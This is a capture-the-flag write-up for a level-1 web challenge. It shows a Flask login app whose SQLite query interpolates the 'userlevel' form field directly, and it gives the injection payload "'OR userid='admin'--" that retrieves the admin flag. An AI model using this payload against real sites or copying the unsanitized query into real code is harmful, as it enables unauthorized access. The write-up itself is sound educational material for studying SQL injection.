# Write-up of the challenge "simple_sqli_chatgpt"

This challenge is part of the "Web" category and is level 1.

# Goal of the challenge

The objective of this challenge is to perform **sql injection**

## Program structure

```python
#!/usr/bin/python3
from flask import Flask, request, render_template, g
import sqlite3
import os
import binascii

app = Flask(__name__)
app.secret_key = os.urandom(32)

try:
    FLAG = open('./flag.txt', 'r').read()
except:
    FLAG = '[**FLAG**]'

DATABASE = "database.db"
if os.path.exists(DATABASE) == False:
    db = sqlite3.connect(DATABASE)
    db.execute(
        'create table users(userid char(100), userpassword char(100), userlevel integer);')
    db.execute(
        f'insert into users(userid, userpassword, userlevel) values ("guest", "guest", 0), ("admin", "{binascii.hexlify(os.urandom(16)).decode("utf8")}", 0);')
    db.commit()
    db.close()


def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(DATABASE)
    db.row_factory = sqlite3.Row
    return db


def query_db(query, one=True):
    cur = get_db().execute(query)
    rv = cur.fetchall()
    cur.close()
    return (rv[0] if rv else None) if one else rv


@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('login.html')
    else:
        userlevel = request.form.get('userlevel')
        res = query_db(f"select * from users where userlevel='{userlevel}'")
        if res:
            userid = res[0]
            userlevel = res[2]
            print(userid, userlevel)
            if userid == 'admin' and userlevel == 0:
                return f'hello {userid} flag is {FLAG}'
            return f'<script>alert("hello {userid}");history.go(-1);</script>'
        return '<script>alert("wrong");history.go(-1);</script>'


app.run(host='0.0.0.0', port=8000)
```

## Vulnerability

This is bad because it directly uses `userlevel` without any sanitization!

```sql
res = query_db(f"select * from users where userlevel='{userlevel}'")
```

This is bad because it returns without any **sanitization**.

## Solution

If we analyze the code properly we can see that if we need to login as `admin` and get the flag then we need to pass this check:

```python
if userid == 'admin' and userlevel == 0:
                return f'hello {userid} flag is {FLAG}'
```

So now our idea is clear all we need to do is launch a **Sql injection** where we try to make the sql injection more like:

```
res = query_db(f"select * from users where userlevel='' OR userid='admin'--'")
```

What this will make is close the userid qoetes `'` and then we control any call and we select where the userid is **admin** and comment (`--`) out the rest.

Solve:

```
'OR userid='admin'--
```
